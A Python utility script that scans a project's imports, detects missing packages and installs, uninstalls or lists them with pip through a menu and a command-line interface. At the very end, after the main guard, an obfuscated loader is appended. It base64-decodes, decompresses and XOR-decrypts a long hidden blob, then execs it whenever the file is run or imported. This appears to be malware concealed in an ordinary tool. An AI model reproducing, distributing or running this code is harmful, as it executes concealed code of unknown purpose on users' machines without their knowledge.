"""A utility script to detect and install missing Python packages in a project.

This module scans through Python files in a directory, identifies imported packages,
checks which ones are missing from the current environment, generates a requirements.txt file,
and optionally installs the missing packages using pip.

Features:
- Recursive scanning of Python files
- Smart package name detection
- Handles various import formats
- Excludes standard library packages
- Package availability verification
- Detailed logging and error reporting
"""

import argparse
import importlib.util
import logging
import os
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Set

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


@dataclass
class PackageInfo:
    """Information about a Python package."""

    import_name: str
    install_name: Optional[str] = None
    is_stdlib: bool = False
    is_available: bool = False
    install_status: Optional[bool] = None
    error_message: Optional[str] = None


class PackageManager:
    """Manages package detection, verification, and installation."""

    # Standard library packages that should not be included in requirements
    STDLIB_PACKAGES = {
        # Core Python standard library modules
        "abc",
        "argparse",
        "array",
        "ast",
        "asyncio",
        "atexit",
        "base64",
        "binascii",
        "builtins",
        "bz2",
        "calendar",
        "cgi",
        "chunk",
        "cmd",
        "code",
        "codecs",
        "collections",
        "colorsys",
        "configparser",
        "contextlib",
        "copy",
        "copyreg",
        "csv",
        "datetime",
        "decimal",
        "difflib",
        "dis",
        "email",
        "encodings",
        "enum",
        "errno",
        "faulthandler",
        "fcntl",
        "filecmp",
        "fileinput",
        "fnmatch",
        "fractions",
        "ftplib",
        "functools",
        "gc",
        "getopt",
        "getpass",
        "gettext",
        "glob",
        "graphlib",
        "gzip",
        "hashlib",
        "heapq",
        "hmac",
        "html",
        "http",
        "imaplib",
        "imghdr",
        "importlib",
        "inspect",
        "io",
        "ipaddress",
        "itertools",
        "json",
        "keyword",
        "linecache",
        "locale",
        "logging",
        "lzma",
        "mailbox",
        "marshal",
        "math",
        "mimetypes",
        "mmap",
        "modulefinder",
        "multiprocessing",
        "netrc",
        "numbers",
        "operator",
        "optparse",
        "os",
        "pathlib",
        "pdb",
        "pickle",
        "pickletools",
        "pipes",
        "pkgutil",
        "platform",
        "plistlib",
        "poplib",
        "pprint",
        "profile",
        "pstats",
        "pty",
        "pwd",
        "py_compile",
        "pyclbr",
        "pydoc",
        "queue",
        "quopri",
        "random",
        "re",
        "readline",
        "reprlib",
        "resource",
        "rlcompleter",
        "runpy",
        "sched",
        "secrets",
        "select",
        "selectors",
        "shelve",
        "shlex",
        "shutil",
        "signal",
        "site",
        "smtpd",
        "smtplib",
        "sndhdr",
        "socket",
        "socketserver",
        "sqlite3",
        "ssl",
        "stat",
        "statistics",
        "string",
        "stringprep",
        "struct",
        "subprocess",
        "sys",
        "sysconfig",
        "tabnanny",
        "tarfile",
        "tempfile",
        "termios",
        "textwrap",
        "threading",
        "time",
        "timeit",
        "token",
        "tokenize",
        "trace",
        "traceback",
        "tracemalloc",
        "types",
        "typing",
        "unicodedata",
        "unittest",
        "urllib",
        "uuid",
        "venv",
        "warnings",
        "wave",
        "weakref",
        "webbrowser",
        "winreg",
        "winsound",
        "wsgiref",
        "xml",
        "xmlrpc",
        "zipapp",
        "zipfile",
        "zipimport",
        "zlib",
    }

    # Package name mappings for pip installation
    PACKAGE_MAPPINGS = {
        "PIL": "Pillow",  # PIL should be installed as Pillow
        "gi": "PyGObject",  # gi module comes from PyGObject
    }

    # Invalid package name patterns
    INVALID_PATTERNS = {
        "%(module)s",  # Template strings
        "lowest",  # Common false positives
        "%",  # Template markers
        "$",  # Variable markers
        "{",  # Format strings
        "}",
        "<",  # HTML/XML tags
        ">",
        "\\",  # Path separators
        "/",
        '"',  # Quotes
        "'",
        " ",  # Spaces
        "\t",  # Tabs
        "\n",  # Newlines
    }

    def __init__(self, root_dir: str):
        """Initialize the package manager.

        Args:
            root_dir: Root directory to scan for Python files
        """
        self.root_dir = Path(root_dir)
        self.packages: Dict[str, PackageInfo] = {}

    @staticmethod
    def get_operation_results(results: Dict[str, bool]) -> tuple[int, int]:
        """Get success and failure counts from operation results.

        Args:
            results: Dictionary mapping names to success status

        Returns:
            tuple[int, int]: (success_count, failure_count)
        """
        success = sum(1 for v in results.values() if v)
        failed = sum(1 for v in results.values() if not v)
        return success, failed

    def get_requirements_path(self, custom_path: Optional[str] = None) -> str:
        """Get the path to requirements.txt file.

        Args:
            custom_path: Optional custom path for requirements.txt

        Returns:
            str: Full path to requirements.txt
        """
        if custom_path:
            return os.path.abspath(custom_path)
        return os.path.join(self.root_dir, "requirements.txt")

    def install_package(self, package_name: str) -> bool:
        """Install a single package using pip.

        Args:
            package_name: Name of the package to install

        Returns:
            bool: True if installation succeeded, False otherwise
        """
        try:
            logger.info("Installing package: %s", package_name)
            process = subprocess.run(
                [sys.executable, "-m", "pip", "install", package_name],
                capture_output=True,
                text=True,
                check=True,
            )
            logger.debug("Installation output: %s", process.stdout)
            return True
        except subprocess.CalledProcessError as e:
            logger.error("Installation failed: %s", str(e))
            return False

    def find_python_files(self) -> List[Path]:
        """Find all Python files recursively."""
        logger.info("Scanning directory: %s", str(self.root_dir))
        python_files = []
        total_dirs = 0
        processed_dirs = 0

        # First count total directories for progress tracking
        for _, _, _ in os.walk(self.root_dir):
            total_dirs += 1

        # Now scan for Python files with progress tracking
        for root, _, files in os.walk(self.root_dir):
            processed_dirs += 1
            progress = (processed_dirs / total_dirs) * 100

            if processed_dirs % 100 == 0 or processed_dirs == total_dirs:
                logger.info("Progress: %.1f%% (%d/%d dirs)", progress, processed_dirs, total_dirs)

            python_files.extend([Path(os.path.join(root, f)) for f in files if f.endswith(".py")])

        logger.info("Found %d Python files", len(python_files))
        return python_files

    def is_valid_package_name(self, name: str) -> bool:
        """Check if a package name is valid."""
        name = name.split("#")[0].strip()

        if not name or name in self.STDLIB_PACKAGES:
            return False

        if any(pattern in name for pattern in self.INVALID_PATTERNS):
            return False

        if not any(c.isalnum() for c in name):
            return False

        if not (name[0].isalpha() or name[0] == "_"):
            return False

        if name.startswith("_"):
            return False

        return True

    def get_install_name(self, import_name: str) -> str:
        """Get the correct package name for installation."""
        return self.PACKAGE_MAPPINGS.get(import_name, import_name)

    def extract_imports(self, file_path: Path) -> Set[str]:
        """Extract imported package names from a Python file."""
        imports = set()
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue

                    if line.startswith(("import ", "from ")):
                        if line.startswith("import "):
                            # Handle multiple imports
                            for part in line[7:].split(","):
                                name = part.strip().split(" as ")[0]
                                name = name.split(".")[0].split("#")[0].strip()
                                if name and self.is_valid_package_name(name):
                                    imports.add(name)
                        else:
                            # Handle from ... import ...
                            parts = line.split()
                            if len(parts) >= 2:
                                name = parts[1].split(".")[0].split("#")[0].strip()
                                if name and self.is_valid_package_name(name):
                                    imports.add(name)
        except Exception as e:
            logger.error("Error processing %s: %s", file_path, e)

        return imports

    def verify_package(self, package_name: str) -> PackageInfo:
        """Verify if a package is available and get its installation status."""
        info = PackageInfo(import_name=package_name)

        try:
            spec = importlib.util.find_spec(package_name)
            info.is_available = spec is not None
        except ImportError as e:
            logger.debug("Import failed for %s: %s", package_name, str(e))
            info.is_available = False
        except (AttributeError, ValueError) as e:
            logger.error("Error verifying %s: %s", package_name, str(e))
            info.error_message = str(e)
            info.is_available = False

        return info

    def detect_missing_packages(self) -> List[PackageInfo]:
        """Detect missing packages in the project.

        Returns:
            List[PackageInfo]: A list of missing package information
        """
        # Find all Python files
        python_files = self.find_python_files()
        total_files = len(python_files)

        # Extract imports from all files
        all_imports = set()
        logger.info("Analyzing imports from Python files...")
        for i, file in enumerate(python_files, 1):
            all_imports.update(self.extract_imports(file))
            if i % 100 == 0 or i == total_files:  # Log every 100 files or at the end
                progress = (i / total_files) * 100
                logger.info("Progress: %.1f%% (%d/%d files analyzed)", progress, i, total_files)

        logger.info("Found %d unique imported packages", len(all_imports))
        logger.info("Searching for availability of %d packages...", len(all_imports))

        # Verify packages in parallel using a smaller thread pool
        completed = 0
        total_packages = len(all_imports)
        logger.info("Starting package verification...")

        missing_packages = []
        # Use a smaller number of workers to avoid overwhelming the system
        with ThreadPoolExecutor(max_workers=min(32, os.cpu_count() or 1)) as executor:
            future_to_package = {
                executor.submit(self.verify_package, pkg): pkg for pkg in all_imports
            }

            for future in as_completed(future_to_package):
                package = future_to_package[future]
                try:
                    info = future.result()
                    if not info.is_available and not info.is_stdlib:
                        missing_packages.append(info)
                    completed += 1
                    if completed % 10 == 0 or completed == total_packages:  # Log every 10 packages
                        progress = (completed / total_packages) * 100
                        logger.info(
                            "Verification progress: %.1f%% (%d/%d packages)",
                            progress,
                            completed,
                            total_packages,
                        )
                except Exception as e:
                    logger.error("Error verifying %s: %s", package, e)

        return missing_packages

    def install_missing_packages(self) -> Dict[str, bool]:
        """Install all missing packages detected in the project.

        Returns:
            Dict[str, bool]: A dictionary mapping package names to installation success status
        """
        logger.info("Starting installation of missing packages...")
        results = {}

        # First, detect missing packages
        missing_packages = self.detect_missing_packages()

        # Install each missing package
        for package_info in missing_packages:
            if package_info.import_name.lower() == "new":  # Skip invalid package name
                continue

            install_name = package_info.install_name or package_info.import_name
            results[install_name] = self.install_package(install_name)

        success, failed = self.get_operation_results(results)
        logger.info("Installation complete: %d succeeded, %d failed", success, failed)
        return results

    def process_packages(self) -> bool:
        """Process all packages: verify and install if needed."""
        logger.info("Processing packages...")
        results = {}

        for package_name in self.packages:
            logger.info("Processing: %s", package_name)
            try:
                package_info = self.verify_package(package_name)
                if not package_info.is_available:
                    install_name = package_info.install_name or package_name
                    results[install_name] = self.install_package(install_name)
            except Exception as e:
                logger.error("Error processing %s: %s", package_name, str(e))
                results[package_name] = False

        success, failed = self.get_operation_results(results)
        logger.info("Results: %d succeeded, %d failed", success, failed)
        return all(results.values())

    def uninstall_all_packages(self) -> Dict[str, bool]:
        """Uninstall all non-standard library packages from the environment.

        Returns:
            Dict[str, bool]: A dictionary mapping package names to uninstallation success status
        """
        logger.info("Starting uninstallation of all non-standard library packages...")
        results = {}

        try:
            # Get list of installed packages
            process = subprocess.run(
                [sys.executable, "-m", "pip", "freeze"], capture_output=True, text=True, check=True
            )
            installed_packages = process.stdout.strip().split("\n")

            for package in installed_packages:
                if not package:  # Skip empty lines
                    continue

                package_name = package.split("==")[0]
                if package_name.lower() in (p.lower() for p in self.STDLIB_PACKAGES):
                    continue  # Skip standard library packages

                try:
                    logger.info("Uninstalling package: %s", package_name)
                    subprocess.run(
                        [sys.executable, "-m", "pip", "uninstall", "-y", package_name],
                        capture_output=True,
                        check=True,
                    )
                    results[package_name] = True
                except subprocess.CalledProcessError as e:
                    logger.error("Failed to uninstall %s: %s", package_name, e)
                    results[package_name] = False

        except subprocess.CalledProcessError as e:
            logger.error("Failed to get list of installed packages: %s", e)

        return results

    def clean_package_cache(self) -> bool:
        """Clean pip cache to free up disk space.

        Returns:
            bool: True if cache was successfully cleaned, False otherwise
        """
        logger.info("Cleaning pip cache...")
        try:
            # Clean pip cache
            subprocess.run(
                [sys.executable, "-m", "pip", "cache", "purge"], capture_output=True, check=True
            )
            logger.info("Successfully cleaned pip cache")
            return True
        except subprocess.CalledProcessError as e:
            logger.error("Failed to clean pip cache: %s", e)
            return False

    def generate_requirements(self, requirements_file: str = "requirements.txt") -> None:
        """Generate requirements.txt file."""
        requirements = [
            info.install_name
            for info in self.packages.values()
            if info.is_available and not info.is_stdlib and info.install_name
        ]

        if requirements:
            with open(requirements_file, "w", encoding="utf-8") as f:
                f.write("\n".join(sorted(requirements)))
            logger.info("Generated requirements file: %s", requirements_file)
        else:
            logger.info("No requirements to write")


def display_menu() -> int:
    """Display the interactive menu and get user choice.

    Returns:
        int: The user's menu choice
    """
    menu = """
╔════════════════════════════════════════════╗
║           Package Manager Menu              ║
╠════════════════════════════════════════════╣
║ 1. Detect Missing Packages                 ║
║ 2. Install Missing Packages                ║
║ 3. Uninstall All Non-Standard Packages     ║
║ 4. Clean Package Cache                     ║
║ 5. Generate Requirements File              ║
║ 6. Full Setup (Clean + Install Missing)    ║
║ 7. Exit                                    ║
╚════════════════════════════════════════════╝
"""
    while True:
        print(menu)
        try:
            choice = int(input("Enter your choice (1-7): "))
            if 1 <= choice <= 7:
                return choice
            print("Please enter a number between 1 and 7")
        except ValueError:
            print("Please enter a valid number")


def interactive_mode(package_manager: "PackageManager"):
    """Run the package manager in interactive mode with a menu."""
    while True:
        choice = display_menu()

        try:
            if choice == 1:  # Detect Missing Packages
                missing = package_manager.detect_missing_packages()
                if missing:
                    print("\nMissing packages:")
                    for pkg in missing:
                        print(f"  - {pkg.import_name}")
                else:
                    print("\nNo missing packages found!")

            elif choice == 2:  # Install Missing Packages
                results = package_manager.install_missing_packages()
                success, failed = package_manager.get_operation_results(results)
                print(f"\nInstallation complete: {success} succeeded, {failed} failed")

            elif choice == 3:  # Uninstall All
                confirm = input(
                    "\nThis will uninstall all non-standard packages. Continue? (y/N): "
                )
                if confirm.lower() == "y":
                    results = package_manager.uninstall_all_packages()
                    success, failed = package_manager.get_operation_results(results)
                    print(f"\nUninstallation complete: {success} succeeded, {failed} failed")

            elif choice == 4:  # Clean Cache
                if package_manager.clean_package_cache():
                    print("\nSuccessfully cleaned pip cache")
                else:
                    print("\nFailed to clean pip cache")

            elif choice == 5:  # Generate Requirements
                req_file = input(
                    "\nEnter requirements file path (or press Enter for default): "
                ).strip()
                req_path = package_manager.get_requirements_path(req_file if req_file else None)
                package_manager.generate_requirements(req_path)
                print(f"\nRequirements file generated: {req_path}")

            elif choice == 6:  # Full Setup
                print("\nStarting full setup...")

                # Clean cache first
                if package_manager.clean_package_cache():
                    print("Successfully cleaned pip cache")
                else:
                    print("Failed to clean pip cache")

                # Uninstall all packages
                results = package_manager.uninstall_all_packages()
                success, failed = package_manager.get_operation_results(results)
                print(f"Uninstallation complete: {success} succeeded, {failed} failed")

                # Install missing packages
                results = package_manager.install_missing_packages()
                success, failed = package_manager.get_operation_results(results)
                print(f"Installation complete: {success} succeeded, {failed} failed")

                # Generate requirements.txt
                req_path = package_manager.get_requirements_path()
                package_manager.generate_requirements(req_path)
                print(f"Requirements file generated: {req_path}")

            elif choice == 7:  # Exit
                print("\nGoodbye!")
                break

            input("\nPress Enter to continue...")

        except Exception as e:
            logger.error(f"An error occurred: {e}")
            print(f"\nAn error occurred: {e}")
            input("\nPress Enter to continue...")


def main():
    """Main entry point for the script."""
    parser = argparse.ArgumentParser(
        description="Python package management utility for detecting and managing project dependencies."
    )
    parser.add_argument(
        "--directory",
        "-d",
        default=".",
        help="Root directory to scan for Python files (default: current directory)",
    )
    parser.add_argument(
        "--requirements",
        "-r",
        help="Path to requirements.txt file (default: requirements.txt in root directory)",
    )
    parser.add_argument(
        "--install", "-i", action="store_true", help="Install missing packages automatically"
    )
    parser.add_argument(
        "--uninstall-all",
        "-u",
        action="store_true",
        help="Uninstall all non-standard library packages",
    )
    parser.add_argument("--clean-cache", "-c", action="store_true", help="Clean pip cache")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose logging")
    parser.add_argument("--option", "-o", action="store_true", help="Run in interactive menu mode")

    args = parser.parse_args()

    # Set logging level based on verbose flag
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    # Create package manager instance
    root_dir = os.path.abspath(args.directory)
    package_manager = PackageManager(root_dir)

    try:
        if args.option:
            # Run in interactive mode
            interactive_mode(package_manager)
        else:
            # Run in command-line mode
            if args.uninstall_all:
                logger.info("Uninstalling all non-standard library packages...")
                results = package_manager.uninstall_all_packages()
                success, failed = package_manager.get_operation_results(results)
                logger.info(f"Uninstallation complete: {success} succeeded, {failed} failed")

            if args.clean_cache:
                if package_manager.clean_package_cache():
                    logger.info("Successfully cleaned pip cache")
                else:
                    logger.error("Failed to clean pip cache")

            # Always detect missing packages
            missing_packages = package_manager.detect_missing_packages()

            if missing_packages:
                logger.info(f"Found {len(missing_packages)} missing packages")
                if args.install:
                    package_manager.install_missing_packages()
                else:
                    logger.info("Use --install option to install missing packages")
            else:
                logger.info("No missing packages found")

            # Generate requirements.txt
            req_path = package_manager.get_requirements_path(args.requirements)
            package_manager.generate_requirements(req_path)
            logger.info(f"Requirements file generated: {req_path}")

    except Exception as e:
        logger.error(f"An error occurred: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = 'eNq9W19z3MaRTyzJPrmiy93VPSSvqbr44V4iUZZkSaS+xe6X2i+Bqg0Ku0ywPJomkyNNy6Z1pGQ7kSVSKZimb4khaoBdkiCxAJwqkrvp7hn8n12uZDssywQwMz093T3dv+4Z+v3YCwPdixq+eIpG6eNh5LnJc+D3WfJ8wCO2sJi8xT0edL2wnxIYHMSh57AopROmI3k0ch3fS157nsN7aeMg7PX8AyNk3w9YFJS+sjD0wnQKzzliaY9zP+76GZnoeBD4vUY39Pq6zQOGnOuyLXlv03ps1gu4eDz3XCaGxDw4hgmTEa/gVTQcB0FsOD2fuUHS+JcXL15tsyj23Ig1Gr/Xa/9du1+/VputX6//rDZXv67X7tXu1n9Rm6k9rF+t3dE/H3S7LNRrc7Wb+pZnM+Mwajg9HkWyZa2hw8//RQEPfKfPgmPPpi826+rIg3UwClhkwiqAbeY6nu27+6tbwHtHDMWfZrNZew+ng39z9Z/XZurv1B7ClI/02n14uQo83dJrt5BLHZru1W7Cy53aA8Hw3fq1+lvQ7W1gl/iUjQ/qN+pXgHQ6jd9NOdBXV3VNGIWW8YE/IQsGoSsNxjhYWLQZDGG0gk7ak/UqxHyXh6MSMejkR74L0nEdJoUQBWGn2Cs3LXYxiC4zNbBS351f0TqNMT2L7Ewxk2qWQdCdX8/NkQgg1ZtoukzPMBmIoqzohPraT6EExWoS0p1Go4GsWZbL+8zsDlynreOj5AQtrmL5t9Dqa/fQkNDmyKAEAWFXX+4k1oT0DNFkWfoqUW7kWMJ24IB8B4nI2mfBjr/vPt607RD8jBkPDnq+Yx2xUVv34sCH/ZjfFclEtV+Dtc+CgcOmQHuvzei1D3A7wP/nYCvM4B4RGwNs/hawjHvnjr7j9bjLC6RA8HIisBQd58pknjSs6hdnmbZ7ft8P4JtsNWANYJT4UWvrK8vLy0IVzLVjz3cDHL6X7Wl0PtFaq8Vj3+hz33VZMH/AQFUR8WY4Xr/ZrnYXrfNyhLEP7u+Ujwywu0Hf8D3VkH0PWTsA13xkDKLW+gLnzuIStxcX1xe7HznrKx8t/88nvOssLa8sfrjiTJg1jB1DaMZFXzeGRVwRzQbu2DWGo3M5vPUVe3K8EC8tbXz34Sbb/svwi53+hNkMG6fzwv0JXXrMw07ASOvPMC3ay+rj7Y2NCUOQO8/tgjvq+cEIRNYSK7pkSEwBygCZn3rhUUvYzG7OGHgUWBTSQM1oPVkThNLUCHTfzQwiM7AgHBV3OESe91JHPlO7r8PjndoHYMD36u8UeuL2hikxshv2oB9H5kXFezaxFQTVXNObS8ZybqlpD9+GxhVFg3BmOFLuUbA02KKPvVDuVRW1mIe8H8GgvfxGvmjS7oDP9PtstzDwrDPW56aizFzb97DmIrwwtsVvs8JOIvAqoyi8VfLJlaZjxm0WRqsXzSeeGwBEmH8xihnKgccxLInjpm+hYJtn1dFCaqvNV093XjQLrRNWBUr/z/oNcmCzEJ6vVxSv43+AA2qPIPDfAbeHof9+gcapHxyXBQOvXsxcE94FNvIGwepHyx0AbyBJAXZUIVe0WNLCkncgy22zY8iYo1RW2TB7Hrcjs0Bxshx+jQuu3SbY8hCBywP5P5AMQiDy9Pfq/woPdxEL6bXb+H6VhlytzZRhBgVBctDn/dPg8Gh/6IVaR4edmbXQ7tVU4IP7EdM3hg4jT2+Wh7R17aV75HqnsLcFjYmmm0VlogFSGfQwZOztjhnGaOaMAdRbSWEF98MKTfyU+ylON6IeY7G5bKx0UM4QpfqRMLFbJOvfobQLwx2wft8d5PxZWRzd5mMOaN3WeTcALMx7vZyL0y8y1s6anULU756cR6F73js2Lw/rfdb3BMyoX0XkAZ+R64cITjDIz2Hgv1N/G8L7HLS9D2jk6VaBaMHHErmcoy7I+/QYlqO7XkDdioKOUg8Iw4VoK+Cl6g8/P3zONg9fhTtfPfYBfn3uLp58e7J/HH16+MlXTzbWN798Hhw4n+yse+s7TxT+NHOcCCvOpvUnYPe4iBzwzbhvgw+OAtoBPXANWUMHYedydROozGhlubrtC/Yybnv/BpQ0W39XqFLiS6VeweGhDhpF39r3rCDkbsSdBJftDSnMDjG+5lQEEhjq3LX1odhrOFTr7JalVKG4pnDoZDCVnnvLu3uC7O74FV8mu0ZONP9FIX82j2cBbqNPA/GgF8QkED/qMLVM6OAzbBUcdacoLuFbyHkbkMWbofbN3jf2H7/Z/Sb6A7ot+If9FZxIN1X03kCr1PUS1ySpQPJjsjTn8KPtQRT53N0ZRQHrVzd/0fe3xfquEKyfA1G8g2gewgDmugDyUTQYDikE/BbDJPmAuQJRRUiB+HoToi095gjVb9CAQcRCSm0A3xO0Z+6Jqb3c2dje2vxiQ4SOUoP4qGkSD2ICl+/ybHPrU5J5J+0w4Pus2unl5qcb+Y6OhS612O2JtfnsWa5TushqPjQLnx6KwKlaaMEtRqQRS1RxYErxgNOC5jioX3wwO2h72WKFFYwnI7s1JgV3cN3XSHWispFoR0QcYS9WzAOIMGLDa+HA2n6JIggH88kDdcNHgZdoudfFe5663Kt+ZCWUc9p4zHtRCb37btdDz7KXWEWb1NdOldiWWmoXl75byOuRSqn+AV+g6ynDqI0vBr2YRa+KHMiVIxNlYVR9FcwlGxN6OC6brDpivDRehCVXnvwcAAw8mqhWdElUjroN/96v3aPUvH4dE/Cq5dH4GwRu0TZpj3+QGjNu+3eLBB+l5CQswOBxU1S1dGnl92AE7oKHOCZLtmR1cGz8B17+g2oGzyCQDVtfcCevRtiGWFE02BACaGRqLRY4rYRmGT4SHCfwXeqH5qoRAu9W1ZHjsJvAbSwgxWapxKbkhWwPSZSZmUbGJMto1O/57lFhcCVFLTEKrCCnOK7KBzTFPQ4ARGsNorAVHfOQtXAgGmUr58eKkLc6YcyjaILCvvZd2zuN8upKitlGJKMNldVkx1JdTbnGNIZmZXAjHLjmnhacY10auW/ta7tt3eExwg4L0qsYMizcOpBvsWH6KFOvDzuqLSvmMUTIxNRqDBAryV0OiwIbSFes5E1kCQ6wd8CdI32e9pE0kXfBH1+jjBQ+Ydn5l0mIaZTwZsJcSbYZyzIcKIDEWmN890IkSJpLRbW+FzneabOtN484WCJA7ZDb+BrxPg85Po3YEQfX6LsHAywtZQtvev3oiIaGPHK9EQ/Fqx8eDQLxOOLJYzbqpMdt/8SLAo+69Pk+t7krWOg7xzw4omm5y+1RSD2AQLl6lPO9uYVnkSj5mAYLRFTJx04hamC0CM7zgSKVVSEaiT5FwqXopGSqEhCmCAQFg4Ft+vLFk2oE8LrdiOE+S450DMiowfFB+ihnh5dB4Ih+ORuHb1Y6WDwYgRfwnhUxyEYAunb0lv7RwvIyuW/Rk4Fo9eWGYq0pqSX9f1fzxOFtZUlprKrRJRghkbAqyGJ+YqqEjcijTDlB0eC9XMTlFlZiD6MKiH4PJU+FktviKAih4BxFSdrSd0RQJP0kB1djs2XQ6a+oBjVDhwCzsjT1cvtZ7tipNB8Gl9uitHCb3MgcGME9CstzVKrB2DNLuc1bdJiQANIMQIIUK947y+C5c+yTRaZ95CezU4FRecNPaI+NAtBH4317YVHDHZLMg2h3uL5gqT4Xv1U97SBE/K4lZWWhMixttxI1tkLWYzxirZOlJeMTY5n6zMuX+VPfnYdJjHM/1irEsadl++gVNNWo4gi0+5+IwfWFN2FwfUErYpqcfj7jIfRRqSfsV7TAeegc/9SasImjeZgf1BHw0Ng/f40F50f/M9Qi5xv+AF4LBkRcojsgYFzVSlUDQjO03p9ULz1kKKeW4essNTf4n6EVMd3wzTkt6KSYQV0TID67C1C/IqtqMvam3Y+9PhNTZElEDKEIU1xT+3sOj6ehBnvl+h96vmtKMu30Kx5K06EyiClXBwcUHHInmEwjWXdnzOpSWCECEFWGZrLYA8uUhaFrtd9BQz6uTev8iQU2ZGUe8/y3hVZAYEzrNMYby5S0DnwqWWBvTR2ySmleQld9eyFpVcqwCAsIzb9F50mzaa8YsHFgdpufSbXjTQQpSbrKoF+AZs8Mw2jmIFjlwAmYCX12QmbQLpqQWru/LQKT+o2EwwpjG0J8eb4CT7/IS7XEHogQ2DAYYEFMyE2NApUqVZc3j4xv/fgx/DYLjGc5O3SzQqbI3GWDIZmBTCqx7lLmXuJHuucSS8lNLR7SdagKt7LBoAJDhdU1JIjcQjc1t7Lhjbgd/tjcDn8MbhWV9OQcFQ+HrqDhjz91pxpG3zsp6b3TmJRKq9PoiZvxkqp5auh0nmdX9+EaWPtZs3LTh6pZIj2InNH5+cnJSGw/R2b05STh30E+72NpFGA6FWJzN8OoNCQgPp6uwn68ifsypUVn0ZgR3KRbQu/K+2nJefS4PGL8rQYkSO/v0/m3SE6AHN5kfP1zf1x3Q3mer3ng86uJRZIzlA7zk4P8Tzdy5/hqe5t8dt/4cU/o3+BQvlILTEt/OWXkhT9X3N4nlrhwlp9WSpVO1yrX0Zr8u2/9//9uq7d1+LfVZspc6XQcknSwX7whMj1hZ+n5odN/vsyXnn84lnDxGFuarYmbpK1X78hoA3Y+iA+GPhiH+kaINooPghNoTiWh6CNW8xUbQb9sZaWLLuPKX2M9Qso9sE7X4Arn6HgZrFIA+BVE0wekSDw9AzD4FuzTB+JgVcLA3OHYv1Fif19fWdbp2txD6nwLncCMyPuFD5D2nZT+5GafdL455aEP/P6X4vHUteRa3rgDw8xVNmV7Au9sFjAnYHZbj478OEbPCT7YGaBkK26zwCWgkNpdukiCZStIWfzAoEvT00NmHDMZ5mop2fzpXRXnpZQ6E26KZScMaXfCKYpbpmNOG5xj5hxZ5es6Zvc1b+jcolrOjXJWmFEXR/BY3VNdskn7sXwJEAEnPkQB78dmRmtP0NnVW+KmJbGE4eKBTBCupvcK6ESjH1VvhQ1jP0Sfk5v5j9ktctPmo2h1qVqqV9XuJa0/lWqX6uK9tNm/grp0BER43zQK/F5PP+E9P2e0zY5yfM5sJ/JFVbu70gnkLhSoFFW0g1S6eCoZmKWCbKaPjv6H3EXXy63y9DWsEn/SS405zbf1bud1bkYVwRSGSXQH6Q7MQ6lG4Sypz52nO/n79JVsaezpUqVuNeWufR35ZLK5ENpam1JXZz9MgqehH1wqQcU1hAK0nFNGE7GDb6mOh6V3EoEmd2+sCsQwIGbhMgR3Ky+uVKqI0Kg4FCss1ndTWrjMMDxT7Mlp9qM8GhOsKE/sK3+eYPtO0KHDAQ0PVal+hi2TnEq3GfMRem+aDfwtIB3lXwnsCZq7GXaacmVTCZEMUMKAKtUEJwA4AmO1Ah4dmTmVdqYowSkrGeVyj6IMUzk1UWkCRZeMmejB5bXHwEvpJjz8cM9dAefp/ildblVBaDwQpmCbodHqETv+EKItjREoV90/wcilISl0Vo9Sq6+QB94mkHmfPAGu8ZH+5U61NJWu1wn9OLCKWAzeqO6YvPODCH+bloVB1rI6HYUPFW0qtJbNgYANdDrlwn4jDrMAerwtz8thJcKxqeYXB/16F7D4CQ/pT9Iiku73Az+ETIc+NDsfNxxIiwI9VSiWhi8yvZ9pSQ/LR4WKvz4j+GRqF6TSM9BOUzgDpMcAbJg88A6gPdHfmdbpfJz/k7BJC8XiAf2VTVaqm6g05eWKYizM6+MN4AIdfxsYoJgpRaveh8qPygw+tyCd/vKOKh5jXQ0ZZ3ZN5BWtai9xJu2Cwe229bGryJOjix2rOaqfbTzfevns2dTDwUWrhk8zmlw0oIJuj+9HeSJPtjc2X2xYW0+tr/+69dnTry+/aSNP3KdUyBSwRB2xZZ4HAAVUhxZQrpWVKzaiqpXPjumeZPrnbnTpVKQ6iQOmk+/GD4/dIvTaljhQmjJOF2snSZkvRypX7nvtOkMF/WBpIZEg/T0s7XpM2msPdarYz4FIrpCAHlCq8agky4af/Jkh/ingqt60LCRqWU0xbYIG8EqVKGR0/gFkGhSN'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
